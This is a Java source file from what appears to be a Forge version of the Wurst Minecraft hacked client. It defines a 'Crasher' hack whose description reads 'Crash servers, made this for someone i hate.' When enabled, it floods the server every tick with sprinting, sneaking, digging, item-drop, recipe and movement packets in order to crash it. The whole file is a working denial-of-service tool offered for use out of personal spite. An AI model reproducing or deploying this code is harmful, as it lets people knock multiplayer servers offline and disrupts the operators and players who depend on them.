/*
 * Copyright (C) 2017 - 2019 | Wurst-Imperium | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.forge.hacks;

import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumFacing;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.wurstclient.fmlevents.WUpdateEvent;
import net.wurstclient.forge.Category;
import net.wurstclient.forge.Hack;
import net.wurstclient.forge.settings.CheckboxSetting;
import net.wurstclient.forge.utils.PlayerUtils;

public final class Crasher extends Hack {
	public Crasher() {
		super("Crasher", "Crash servers, made this for someone i hate.");
		setCategory(Category.WORLD);
	}

	@Override
	protected void onEnable() {
		MinecraftForge.EVENT_BUS.register(this);
	}

	@Override
	protected void onDisable() {
		MinecraftForge.EVENT_BUS.unregister(this);
	}

	@SubscribeEvent
	public void onUpdate(WUpdateEvent event) {
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.START_SPRINTING));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.STOP_SPRINTING));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.START_SNEAKING));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.STOP_SNEAKING));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.START_FALL_FLYING));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.OPEN_INVENTORY));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.START_RIDING_JUMP));
		mc.player.connection.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.STOP_RIDING_JUMP));
		mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, PlayerUtils.GetLocalPlayerPosFloored(), EnumFacing.DOWN));
		mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.START_DESTROY_BLOCK, PlayerUtils.GetLocalPlayerPosFloored(), EnumFacing.DOWN));
		mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, PlayerUtils.GetLocalPlayerPosFloored(), EnumFacing.DOWN));
		mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.RELEASE_USE_ITEM, PlayerUtils.GetLocalPlayerPosFloored(), EnumFacing.DOWN));
		mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ALL_ITEMS, PlayerUtils.GetLocalPlayerPosFloored(), EnumFacing.DOWN));
		mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ITEM, PlayerUtils.GetLocalPlayerPosFloored(), EnumFacing.DOWN));
		mc.player.connection.sendPacket(new CPacketRecipeInfo(true, true));
		mc.player.connection.sendPacket(new CPacketPlayer(true));
		mc.player.connection.sendPacket(new CPacketPlayer(false));
	}
}
